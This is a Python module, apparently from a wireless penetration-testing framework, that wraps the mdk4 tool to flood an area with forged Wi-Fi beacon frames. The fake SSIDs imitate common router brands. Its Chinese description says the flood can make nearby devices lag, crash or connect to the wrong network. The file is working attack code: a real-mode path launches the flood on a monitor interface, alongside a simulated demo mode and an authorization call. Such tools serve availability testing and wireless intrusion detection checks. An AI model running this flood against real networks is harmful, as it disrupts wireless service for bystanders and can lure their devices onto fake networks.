"""Beacon Flood：海量伪造 Beacon 帧."""

from __future__ import annotations

import asyncio
import random
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from ..core.utils import make_run_dir


class BeaconFlood(AttackModule):
    id = "beacon_flood"
    name = "Beacon 洪泛"
    category = "availability"
    description = (
        "使用 mdk4 广播大量伪造 Beacon 帧，污染客户端/扫描器的网络列表，"
        "可导致部分设备卡顿、崩溃或误连。用于可用性测试与 WIDS 检测能力验证。"
    )
    requires = ("mdk4",)
    risk = "high"
    needs_monitor = True
    options = [
        Option("count", "伪造 SSID 数量", "int", 120, "生成的随机 SSID 数量"),
        Option("channel", "信道", "int", 0, "0 表示跳频"),
        Option("timeout", "运行时长（秒）", "int", 60, "洪泛持续时间"),
        Option("ssids", "自定义 SSID 列表", "textarea", "", "每行一个；留空则自动生成"),
    ]

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        count = max(1, min(int(params.get("count") or 120), 5000))
        channel = int(params.get("channel") or 0)
        timeout = max(5, int(params.get("timeout") or 60))
        ctx.authorize("beacon_flood", "", f"{count} SSIDs")

        raw_ssids = str(params.get("ssids") or "").strip()
        ssids = [line.strip() for line in raw_ssids.splitlines() if line.strip()]
        if not ssids:
            ssids = _generate_ssids(count)
        ctx.emit(
            "attack",
            f"Beacon Flood：{len(ssids)} 个 SSID · {'跳频' if not channel else 'ch' + str(channel)} · {timeout}s",
            ssids=len(ssids),
        )

        if ctx.demo:
            for index in range(3):
                await asyncio.sleep(0.6)
                ctx.emit(
                    "info",
                    f"已注入 {len(ssids) * (index + 1)} 个伪造 Beacon（模拟）",
                    sent=len(ssids) * (index + 1),
                )
            ctx.finding(
                "可注入伪造 Beacon 帧",
                "medium",
                ssid=ssids[0] if ssids else "",
                detail=f"一次性广播 {len(ssids)} 个伪造 SSID，说明管理帧缺乏保护。",
                category="availability",
            )
            return AttackResult(
                ok=True,
                summary=f"已广播 {len(ssids)} 个伪造 SSID（模拟）",
                detail={"demo": True, "ssids": ssids[:20], "count": len(ssids)},
                duration=time.time() - started,
            )

        monitor = await ctx.monitor()
        run_dir = make_run_dir(ctx.config.run_path, "beaconflood")
        list_path = run_dir / "ssids.txt"
        list_path.write_text("\n".join(ssids) + "\n", encoding="utf-8")
        cmd = ["mdk4", monitor, "b", "-f", str(list_path), "-s", "1200"]
        if channel:
            cmd += ["-c", str(channel)]
            await ctx.set_channel(channel)
        ctx.emit("info", f"mdk4 已启动：{' '.join(cmd)}")
        proc = await ctx.runner.background(cmd, delay=2.0, on_line=lambda line: ctx.log(line))
        try:
            await asyncio.sleep(timeout)
        finally:
            await ctx.runner.terminate(proc)
        ctx.finding(
            "Beacon 洪泛可用性影响",
            "medium",
            detail=f"向 {len(ssids)} 个伪造 SSID 持续广播 Beacon 达 {timeout}s。",
            category="availability",
        )
        return AttackResult(
            ok=True,
            summary=f"Beacon 洪泛完成（{len(ssids)} 个 SSID，{timeout}s）",
            detail={"ssids": ssids[:20], "count": len(ssids), "channel": channel},
            duration=time.time() - started,
        )


def _generate_ssids(count: int) -> list[str]:
    brands = ["CMCC", "ChinaNet", "TP-LINK", "HUAWEI", "Xiaomi", "Redmi", "H3C", "Ruijie",
              "MERCURY", "Tenda", "FreeWiFi", "Guest", "IoT", "Printer", "CCTV"]
    rng = random.Random(2024)
    out = []
    for _ in range(count):
        out.append(f"{rng.choice(brands)}-{rng.randint(0x1000, 0xFFFF):04X}")
    return out
